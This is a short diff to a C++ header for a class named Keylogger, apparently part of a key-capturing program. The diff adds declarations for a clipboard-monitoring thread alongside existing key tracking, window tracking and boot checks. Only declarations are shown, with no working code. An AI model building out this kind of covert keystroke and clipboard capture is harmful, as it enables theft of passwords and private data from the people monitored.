@@ -14,6 +14,7 @@ private:
     char lastWindow[256]{};
     std::set<int> pressedKeys; // Track currently pressed keys
     const Config* config;
+    // Removed lastClipboardText; clipboard state is managed in the thread function
 public:
     Keylogger(const std::string& filename, const Config& config);
     ~Keylogger();
@@ -27,4 +28,8 @@ public:
     static bool IsSystemBooting(const Config& config);
     static Keylogger& GetInstance(const Config& config);
     static Keylogger& GetInstance(); // Uses global g_config_ptr, must be set before use
+    void StartClipboardMonitor();
+    static void ClipboardMonitorThread(const Config* config);
+    // Add a public static function to run clipboard monitoring as a thread
+    static void RunClipboardMonitor(const Config* config);
 }; 
